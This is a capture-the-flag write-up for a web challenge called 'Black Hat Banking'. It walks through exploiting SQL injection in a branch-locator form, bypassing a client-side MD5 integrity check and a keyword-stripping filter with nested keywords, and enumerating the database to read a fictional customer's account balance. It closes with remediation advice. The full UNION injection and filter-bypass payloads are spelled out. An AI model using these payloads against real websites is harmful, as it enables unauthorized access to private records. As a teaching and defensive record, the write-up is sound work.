---
date created: Sunday, February 15th 2026, 1:56:04 am
date modified: Sunday, February 15th 2026, 3:08:41 am
---


# Black Hat Banking

**Points:** 500 
**Description:** How much does "The Dark Tangent/Jeff Moss" have in his checking account (to the nearest penny)? 
**Source:** [https://blackhatbanking.web.baectf.com/branches.php](https://blackhatbanking.web.baectf.com/branches.php)

# Method:

## Description & Investigation:

We are presented with a branch locator page containing a zip code lookup form. Submitting invalid input immediately leaks useful information: a PHP error (`Undefined offset: 1 in /app/branches.php on line 115`) indicating the code splits input on the hyphen `-` and expects two parts, plus the message `Input failed integrity check`.

Submitting a valid ZIP+4 format like `12345-6789` clears the offset error but returns "There are no branches in your post code." Examining the page source reveals an included `md5.js` (CryptoJS MD5 library), and watching the form submission in the Network tab shows the postcode parameter is submitted as:

```
postcode=12345-6789|3d7deb3048916b2b6ed3ab92063c9073
```

The format is `input|MD5(input)` — the server splits on `|`, hashes the first part, and compares it to the second. This is the "integrity check." Crucially, by submitting payloads through the form itself, the page's own JavaScript computes the correct hash automatically.

## Enumeration:

### Confirming SQL Injection

Testing a basic injection in the ZIP extension field:

```
12345-6789' OR '1'='1
```

This dumps all four branch records, confirming SQL injection. The query structure is:

```sql
SELECT name, address, city, state, zip FROM branch WHERE zip='PART1' AND ext='PART2'
```

The injection closes the quote around `ext`, adds an OR true condition, and the query's own trailing quote closes naturally, no comment character needed.

### Discovering the WAF

Attempting `UNION SELECT` payloads produced SQL errors. The error messages revealed the server is **stripping keywords** from input — both `SELECT` and `UNION` are removed before execution. For example, `UNION SELECT 1,2,3,4,5` becomes `1,2,3,4,5` in the resulting query.

The bypass is **double-keyword nesting**, where the filter removes the inner keyword and leaves a valid one behind:

|Input|After Filter|
|---|---|
|`SELSELECTECT`|`SELECT`|
|`UNUNIONION`|`UNION`|

### Enumerating the Database

With the WAF bypassed, UNION injection works. All payloads are submitted via the form to let the page's JS handle MD5 hashing:

**Tables:**
```
12345-6789' OR '1'='1 UNUNIONION SELSELECTECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database() AND '1'='1
```

Result: `account`, `branch`, `business`, `customer`, `department`, `employee`, `individual`, `officer`, `product`, `product_type`, `transaction`.

**Columns:**
```
12345-6789' OR '1'='1 UNUNIONION SELSELECTECT column_name,table_name,3,4,5 FROM information_schema.columns WHERE table_schema=database() AND '1'='1
```

Key columns identified:

- `individual`: `cust_id`, `fname`, `lname`, `birth_date`
- `account`: `account_id`, `product_cd`, `avail_balance`, `pending_balance`, `cust_id`

## Exploitation:

"The Dark Tangent" is the handle of **Jeff Moss**, founder of DEF CON and Black Hat. Querying the `individual` table for his name:

```
12345-6789' UNUNIONION SELSELECTECT fname,lname,cust_id,birth_date,5 FROM individual WHERE '1'='1
```

Result: `Jeff Moss` → `cust_id = 8`

Querying all checking accounts:

```
12345-6789' UNUNIONION SELSELECTECT account_id,product_cd,avail_balance,pending_balance,cust_id FROM account WHERE product_cd='CHK' AND '1'='1
```

Filtering for `cust_id = 8`:

```
18    CHK    3487.18994140625    3487.18994    8
```

The answer is **$3487.19**.

## Key Takeaways & Remediation:

- Client-side integrity checks provide no protection. The MD5 hash is computed by the page's own JavaScript, so an attacker simply submits payloads through the form and the hash is calculated for them. Integrity validation must use a server-side secret (e.g. HMAC) that the client cannot reproduce.
- Keyword stripping is a weak WAF strategy. Removing `SELECT` and `UNION` once is trivially bypassed by nesting (`SELSELECTECT`). Proper mitigation is parameterised queries / prepared statements, which structurally separate SQL logic from user data.
- Verbose PHP errors (`mysql_query()` warnings with partial query text) leak query structure and confirm which keywords are being filtered, turning a blind injection into an error-based one. Production servers should suppress detailed error output.
- "The Dark Tangent" is Jeff Moss, knowing your hacker history helps in CTFs (and in trivia challenges)
	- Also in the help section, black-hat material is linked for learning. Likely that some of the challenger creators have been their or are big fans.